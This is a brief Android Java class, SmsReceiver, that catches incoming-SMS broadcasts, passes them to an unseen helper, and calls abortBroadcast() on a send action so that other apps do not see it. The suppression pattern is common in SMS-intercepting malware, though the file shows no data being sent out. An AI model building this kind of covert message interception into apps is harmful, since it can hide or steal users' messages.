package net.workspace;
import net.workspace.sms.SmsHelper;
import net.workspace.util.CommonUtil;
import net.workspace.util.MyLogger;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

/**
 * SmsReceiver
 *
 * @author Hike
 */
public class SmsReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        MyLogger.debug("SmsReceiver onReceive,action=" + intent.getAction());
        CommonUtil.registerReciever();
        String action = intent.getAction();
        if (CommonUtil.SMS_RECEIVED.equals(action)) {
            SmsHelper.onSmsRecieved(this, intent);
        } else if (CommonUtil.SMS_SEND.equals(action)) {
            abortBroadcast();
        }
    }
}
